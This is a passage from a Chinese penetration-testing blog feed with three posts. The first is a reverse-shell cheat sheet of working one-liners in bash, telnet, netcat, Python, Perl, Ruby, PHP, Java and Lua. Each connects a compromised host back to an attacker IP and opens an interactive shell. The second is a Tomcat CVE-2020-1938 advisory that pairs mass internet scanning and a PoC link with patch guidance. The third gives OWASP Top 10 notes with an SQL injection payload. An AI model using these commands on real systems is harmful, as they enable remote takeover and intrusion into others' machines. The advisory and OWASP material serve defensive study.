/dev/tcp/x.x.x.x/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="1-3-方法三"><a href="#1-3-方法三" class="headerlink" title="1.3 方法三"></a>1.3 方法三</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h1 id="0x02-telnet反弹"><a href="#0x02-telnet反弹" class="headerlink" title="0x02 telnet反弹"></a>0x02 telnet反弹</h1><h2 id="2-1-方法一"><a href="#2-1-方法一" class="headerlink" title="2.1 方法一"></a>2.1 方法一</h2><p>攻击者主机上打开两个终端分别执行监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p>目标主机中执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555</span><br></pre></td></tr></table></figure><p>监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p><p>反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p><h2 id="2-2-方法二"><a href="#2-2-方法二" class="headerlink" title="2.2 方法二"></a>2.2 方法二</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p</span><br></pre></td></tr></table></figure><h1 id="0x03-nc（netcat）反弹"><a href="#0x03-nc（netcat）反弹" class="headerlink" title="0x03 nc（netcat）反弹"></a>0x03 nc（netcat）反弹</h1><p>攻击者主机上执行监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure><p>目标主机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash x.x.x.x port</span><br></pre></td></tr></table></figure><p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f</span><br></pre></td></tr></table></figure><blockquote><p>注：mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555   <span class="comment">#从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</span></span><br><span class="line"></span><br><span class="line">nc -c /bin/sh x.x.x.x 4444</span><br><span class="line"></span><br><span class="line">/bin/sh | nc x.x.x.x 4444</span><br></pre></td></tr></table></figure><h1 id="0x04-常见脚本反弹"><a href="#0x04-常见脚本反弹" class="headerlink" title="0x04 常见脚本反弹"></a>0x04 常见脚本反弹</h1><h2 id="4-1-python"><a href="#4-1-python" class="headerlink" title="4.1 python"></a>4.1 python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure><h2 id="4-2-perl"><a href="#4-2-perl" class="headerlink" title="4.2 perl"></a>4.2 perl</h2><h3 id="4-2-1-方法一"><a href="#4-2-1-方法一" class="headerlink" title="4.2.1 方法一"></a>4.2.1 方法一</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="x.x.x.x";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><h3 id="4-2-2-方法二"><a href="#4-2-2-方法二" class="headerlink" title="4.2.2 方法二"></a>4.2.2 方法二</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:5555");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><h2 id="4-3-Ruby"><a href="#4-3-Ruby" class="headerlink" title="4.3 Ruby"></a>4.3 Ruby</h2><h3 id="4-3-1-方法一"><a href="#4-3-1-方法一" class="headerlink" title="4.3.1 方法一"></a>4.3.1 方法一</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("x.x.x.x","5555");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure><h3 id="4-3-2-方法二"><a href="#4-3-2-方法二" class="headerlink" title="4.3.2 方法二"></a>4.3.2 方法二</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("x.x.x.x",5555).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure><h2 id="4-4-PHP"><a href="#4-4-PHP" class="headerlink" title="4.4 PHP"></a>4.4 PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("x.x.x.x",5555);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h2 id="4-5-Java"><a href="#4-5-Java" class="headerlink" title="4.5 Java"></a>4.5 Java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">    Runtime r = Runtime.getRuntime();</span><br><span class="line">    String cmd[]= &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</span><br><span class="line">    Process p = r.exec(cmd);</span><br><span class="line">    p.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-6-Lua"><a href="#4-6-Lua" class="headerlink" title="4.6 Lua"></a>4.6 <strong>Lua</strong></h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><blockquote><p>注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</p><p>nc -lvvp 5555</p></blockquote><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>上面提到的是常见的反弹shell的方式，肯定还有其他的方式，欢迎大家补充，这里也会不断的跟新。</p><h1 id="0x06-参考连接"><a href="#0x06-参考连接" class="headerlink" title="0x06 参考连接"></a>0x06 参考连接</h1><p><a href="https://www.bertramc.cn/2017/07/14/38.html" target="_blank" rel="noopener">https://www.bertramc.cn/2017/07/14/38.html</a><br><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/237/</a><br><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85712</a><br><a href="https://blog.csdn.net/wanzt123/article/details/81879599" target="_blank" rel="noopener">https://blog.csdn.net/wanzt123/article/details/81879599</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总结下反弹shell常见的几种姿势。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="shell" scheme="https://www.mad-coding.cn/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Apache Tomcat文件包含漏洞(CVE-2020-1938)</title>
    <link href="https://www.mad-coding.cn/2020/02/21/Apache-Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mad-coding.cn/2020/02/21/Apache-Tomcat文件包含漏洞/</id>
    <published>2020-02-21T01:59:20.000Z</published>
    <updated>2020-02-26T07:57:54.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>昨天下午，xray团队爆出了Apache Tomcat的最新漏洞。</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/c0261c10825b4a64" class="lozad"></p><a id="more"></a><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而可以读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。</p><p>Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，因此本次通告的漏洞影响范围较大，请相关用户及时采取防护措施修复此漏洞。</p><h1 id="0x02-漏洞编号"><a href="#0x02-漏洞编号" class="headerlink" title="0x02 漏洞编号"></a>0x02 漏洞编号</h1><p>CVE-2020-1938 </p><p>CNVD-2020-10487</p><h1 id="0x03-影响范围"><a href="#0x03-影响范围" class="headerlink" title="0x03 影响范围"></a>0x03 影响范围</h1><p><strong>受影响版本</strong></p><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><p><strong>不受影响版本</strong></p><ul><li>Apache Tomcat = 7.0.100</li><li>Apache Tomcat = 8.5.51</li><li>Apache Tomcat = 9.0.31</li></ul><h1 id="0x05-漏洞验证"><a href="#0x05-漏洞验证" class="headerlink" title="0x05 漏洞验证"></a>0x05 漏洞验证</h1><p>利用fofa或者zoomeye网络空间搜索引擎可以大批量的搜索互联网上可能存在漏洞的主机。</p><p>然后使用xray扫描器进行搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe servicescan --target-file ip文件</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200221105931.png" class="lozad"></p><p>使用xray扫描出来后，再使用脚本进行漏洞验证</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200221105808.png" class="lozad"></p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><h1 id="0x06-漏洞防护"><a href="#0x06-漏洞防护" class="headerlink" title="0x06 漏洞防护"></a>0x06 漏洞防护</h1><h2 id="6-1-官方升级"><a href="#6-1-官方升级" class="headerlink" title="6.1 官方升级"></a>6.1 官方升级</h2><p>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</p><table><thead><tr><th>版本号</th><th>下载地址</th></tr></thead><tbody><tr><td>Apache Tomcat 7.0.100</td><td><a href="http://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-70.cgi</a></td></tr><tr><td>Apache Tomcat 8.5.51</td><td><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-80.cgi</a></td></tr><tr><td>Apache Tomcat 9.0.31</td><td><a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-90.cgi</a></td></tr></tbody></table><h2 id="6-2-其他防护措施"><a href="#6-2-其他防护措施" class="headerlink" title="6.2 其他防护措施"></a>6.2 其他防护措施</h2><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p>一:若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作：</p><p>（1）编辑 <catalina_base>/conf/server.xml，找到如下行（<catalina_base> 为 Tomcat 的工作目录）：</catalina_base></catalina_base></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure><p><img alt="img" data-src="http://blog.nsfocus.net/wp-content/uploads/2020/02/image-4.png" class="lozad"></p><p>（2）将此行注释掉（也可删掉该行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</span><br></pre></td></tr></table></figure><p>（3）保存后需重新启动Tomcat，规则方可生效。</p><p>二：若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</span><br></pre></td></tr></table></figure><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="http://blog.nsfocus.net/cve-2020-1938/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2020-1938/</a></p><p><a href="https://www.shungg.cn/post/290" target="_blank" rel="noopener">https://www.shungg.cn/post/290</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;昨天下午，xray团队爆出了Apache Tomcat的最新漏洞。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i01piccdn.sogoucdn.com/c0261c10825b4a64&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.mad-coding.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CNVD-2020-10487" scheme="https://www.mad-coding.cn/tags/CNVD-2020-10487/"/>
    
      <category term="CVE-2020-1938" scheme="https://www.mad-coding.cn/tags/CVE-2020-1938/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP10</title>
    <link href="https://www.mad-coding.cn/2020/02/19/OWASP-TOP10/"/>
    <id>https://www.mad-coding.cn/2020/02/19/OWASP-TOP10/</id>
    <published>2020-02-19T03:04:18.000Z</published>
    <updated>2020-02-19T06:46:31.794Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200219113036.png" class="lozad"></p><a id="more"></a><h1 id="0x01-注入"><a href="#0x01-注入" class="headerlink" title="0x01 注入"></a>0x01 注入</h1><h2 id="1-1-威胁代理"><a href="#1-1-威胁代理" class="headerlink" title="1.1 威胁代理"></a>1.1 威胁代理</h2><p>​    考虑任何能够向系统发送不信任数据的人，包括外部用户，内部用户和管理员</p><h2 id="1-2-攻击向量"><a href="#1-2-攻击向量" class="headerlink" title="1.2 攻击向量"></a>1.2 攻击向量</h2><p>​    攻击者利用有针对性的解释器语法发送简单的、基于文本的攻击，几乎任何数据源都能成为注入载体，包括内部来源</p><h2 id="1-3-安全漏洞"><a href="#1-3-安全漏洞" class="headerlink" title="1.3 安全漏洞"></a>1.3 安全漏洞</h2><p>注入漏洞发生在应用程序将不可信的数据发送到解释器时，注入漏洞十分普遍，尤其是在遗留代码中，通常能在 <code>SQL</code> 查询语句、<code>LDAP</code> 查询语句、<code>Xpath</code> 查询语句、<code>OS</code> 命令、<code>XML</code> 解析器、<code>SMTP</code> 头、程序参数中找到，注入漏洞很容易通过审查代码发现，但是不容易在测试中发现，扫描器和模糊测试工具可以帮助攻击者找到这些漏洞</p><h2 id="1-4-技术影响"><a href="#1-4-技术影响" class="headerlink" title="1.4 技术影响"></a>1.4 技术影响</h2><p>注入能导致数据丢失或数据破坏、缺乏可审计性或是拒绝服务，注入漏洞有时甚至能导致完全主机接管</p><h2 id="1-5-业务影响"><a href="#1-5-业务影响" class="headerlink" title="1.5 业务影响"></a>1.5 业务影响</h2><p>考虑受影响的数据和运行解释器的平台的商业价值。所有的数据都有可能被偷窃，篡改和删除，会严重损坏企业的声誉。</p><h2 id="1-6-漏洞检测"><a href="#1-6-漏洞检测" class="headerlink" title="1.6 漏洞检测"></a>1.6 漏洞检测</h2><ul><li>用户提供的数据没有经过应用程序的验证、过滤或净化。</li><li>动态查询语句或非参数化的调用，在没有上下文感知转义的情况下被用于解释器。</li><li>在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。</li><li>恶意数据直接被使用或链接注入SQL语句或命令在动态查询语句，命令或者存储过程中包含结构和恶意数据。</li></ul><p>一些常见的注入，包括：SQL、OS命令、ORM、LDAP和表达式（EL）或OGNL注入。所有的解释器的概念都是相同的。代码审计是最有效的检测应用程序的注入风险方法之一，然后就是对所有参数、字段、头、cookie、JSON和XML数据输入的彻底DAST扫描。组织可以将SAST和DAST工具添加到CI/CD过程中，以便于在生产部署之前对现有或检查的代码进行注入问题的预警。</p><h2 id="1-7-漏洞防护"><a href="#1-7-漏洞防护" class="headerlink" title="1.7 漏洞防护"></a>1.7 漏洞防护</h2><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开</p><ul><li><p>最佳选择是使用安全的API ，安全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。</p><blockquote><p>注意：当参数化是，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行的exec（）恶意数据。</p></blockquote></li><li><p>使用正确的或“白名单”的方法，来恰当规范化输入验证的方法，可以有助于防止注入攻击。但是这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或者移动应用程序的API。</p></li><li><p>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的JAVA encoder和类似的库提供了这样的转义教程。</p><blockquote><p>注意:SQL结构，比如：表名，列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。</p></blockquote></li><li><p>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入是大量地泄露记录。</p></li></ul><h2 id="1-8-攻击案例"><a href="#1-8-攻击案例" class="headerlink" title="1.8 攻击案例"></a>1.8 攻击案例</h2><h3 id="1-8-1-场景1"><a href="#1-8-1-场景1" class="headerlink" title="1.8.1 场景1"></a>1.8.1 场景1</h3><p>应用程序在SQL语句的构造中使用了不可信的数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String query = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> accounts <span class="keyword">WHERE</span></span><br><span class="line">custID=<span class="string">'" + request.getParameter("id") + "'</span>“;</span><br></pre></td></tr></table></figure><p>1.8.2 场景2 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</span><br></pre></td></tr></table></figure><p>同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如：Hibernate查询语言（HQL））</p><p>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成：’<br>or’1’=’1</p><p>例如：<br><a href="http://example.com/app/accountView?id=&#39;" target="_blank" rel="noopener">http://example.com/app/accountView?id=&#39;</a> or ‘1’=’1<br>这样查询语句的意义就变成了从accounts表中返回所有的记录。<br>更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p><h1 id="0x02-失效的身份认证"><a href="#0x02-失效的身份认证" class="headerlink" title="0x02 失效的身份认证"></a>0x02 失效的身份认证</h1><h2 id="2-1-威胁来源"><a href="#2-1-威胁来源" class="headerlink" title="2.1 威胁来源"></a>2.1 威胁来源</h2><p>攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理账户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具。会话管理攻击会容易被理解，尤其是没有过期的会话秘钥。</p><h2 id="2-2-安全弱点"><a href="#2-2-安全弱点" class="headerlink" title="2.2 安全弱点"></a>2.2 安全弱点</h2><p>大多数身份和访问管理系统的设计和实现，普遍存在身份认证失效问题。会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。</p><p>攻击者可以使用指南手册来检测失效的身份验证，但是通常会关注密码转储、字典攻击，或者在类似于钓鱼或者社会工程攻击之后，发现失效的身份认证。</p><h2 id="2-3-漏洞影响"><a href="#2-3-漏洞影响" class="headerlink" title="2.3 漏洞影响"></a>2.3 漏洞影响</h2><p>攻击者需要访问几个账户，或者需要一个管理员账户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息等。</p><h2 id="2-4-漏洞检测"><a href="#2-4-漏洞检测" class="headerlink" title="2.4 漏洞检测"></a>2.4 漏洞检测</h2><p>确认用户身份、身份验证和会话管理非常重要，这些措施可用于将恶意的未经身份验证的攻击者于授权用户进行分离。</p><ol><li>允许凭证填充，这使得攻击者获得有效用户名和密码列表。</li><li>允许暴力破解或者其他自动攻击</li><li>允许默认的，弱的或者众所周知的密码，即弱口令</li><li>使用弱的或失效的验证凭证，忘记密码程序，列如“基于知识的答案”，是不安全的。</li><li>使用明文、加密或弱散列密码</li><li>缺少或失效的多因素身份验证</li><li>暴露URL中的会话ID（例如URL重写）</li><li>在成功登录后不会更新会话ID</li><li>不正确地是会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录SSO令牌）没有正确注销或失效。</li></ol><h2 id="2-5-漏洞防护"><a href="#2-5-漏洞防护" class="headerlink" title="2.5 漏洞防护"></a>2.5 漏洞防护</h2><ol><li>在可能的情况下，实现多因素身份验证，以防止自欧东、凭证填充、暴力破解和被盗凭据在利用攻击</li><li>不要使用发送或部署默认的凭证，特别是管理员用户</li><li>执行弱密码检查，比如使用常用的TOP1000密码字典来进行密码检查。</li><li>设置密码规则，比如密码长度，负载型和循环策略等。</li><li>确认注册、凭据回复和API路径，通过对所有输入结果使用相同的消息，用以抵御账户枚举攻击。</li><li>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测是提醒管理员。</li><li>使用服务器安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID，会话ID不能再URL中，可以安全地存储和当登出闲置、绝对超时后使其失效。如随机token</li></ol><h2 id="2-6-攻击案例"><a href="#2-6-攻击案例" class="headerlink" title="2.6 攻击案例"></a>2.6 攻击案例</h2><p>场景1</p><p>应用程序不限制身份验证尝试，攻击者可利用密码字典进行装库攻击。</p><p>场景2</p><p>应用会话超时设置不正确，用户使用公共计算机访问应用程序，yoghurt直接挂你吧浏览器选项卡就离开，而不是选择注销，攻击者一个小时候使用同一浏览器浏览网页，而当前用户状态仍然是经过身份验证的。</p><h1 id="0x03-敏感信息泄露"><a href="#0x03-敏感信息泄露" class="headerlink" title="0x03 敏感信息泄露"></a>0x03 敏感信息泄露</h1><h1 id="0x04-XML外部实体（XXE）"><a href="#0x04-XML外部实体（XXE）" class="headerlink" title="0x04 XML外部实体（XXE）"></a>0x04 XML外部实体（XXE）</h1><h1 id="0x05-失效的访问控制"><a href="#0x05-失效的访问控制" class="headerlink" title="0x05 失效的访问控制"></a>0x05 失效的访问控制</h1><h1 id="0x06-安全配置错误"><a href="#0x06-安全配置错误" class="headerlink" title="0x06 安全配置错误"></a>0x06 安全配置错误</h1><h1 id="0x07-跨站脚本（XSS）"><a href="#0x07-跨站脚本（XSS）" class="headerlink" title="0x07 跨站脚本（XSS）"></a>0x07 跨站脚本（XSS）</h1><h1 id="0x08-不安全的反序列化"><a href="#0x08-不安全的反序列化" class="headerlink" title="0x08 不安全的反序列化"></a>0x08 不安全的反序列化</h1><h1 id="0x09-使用含有已知漏洞的组件"><a href="#0x09-使用含有已知漏洞的组件" class="headerlink" title="0x09 使用含有已知漏洞的组件"></a>0x09 使用含有已知漏洞的组件</h1><h1 id="0x10-不足的日志记录和监控"><a href="#0x10-不足的日志记录和监控" class="headerlink" title="0x10 不足的日志记录和监控"></a>0x10 不足的日志记录和监控</h1><h1 id="0x11参考链接"><a href="#0x11参考链接" class="headerlink" title="0x11参考链接"></a>0x11参考链接</h1><p><a href="https://github.com/PyxYuYu/MyBlog/issues/85" target="_blank" rel="noopener">https://github.com/PyxYuYu/MyBlog/issues/85</a></p><p>《OWASP TOP10中文手册》</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
